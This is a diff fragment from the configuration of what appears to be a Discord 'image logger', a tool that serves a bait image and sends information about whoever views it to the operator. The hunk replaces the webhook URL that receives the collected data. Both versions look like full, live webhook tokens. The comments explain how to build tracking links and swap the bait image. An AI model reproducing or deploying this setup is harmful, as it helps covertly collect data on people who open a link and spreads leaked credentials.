@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1473588353881473097/wDN6JlYa5YcGnuvvHfttIDdkqyYUteF60KoLyFajrSZAjURzS5-UbkTAy-mWYjFE322u",
+    "webhook": "https://discordapp.com/api/webhooks/1473590436055482430/9n7NGn-u_xqmSa9ofFsKc2KW_yXxkRNHSk21c5A94bDnHaEMuSePrSK2WEeNKqpKVhWU",
     "image": "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExbDVtZWtpb3JpNXpqOXdtMTBkNGF4dHZnc21vMGN6YXprNTM0cmxwMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/ZuzxVIWWHUQDkhrtu6/giphy.gif", 
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
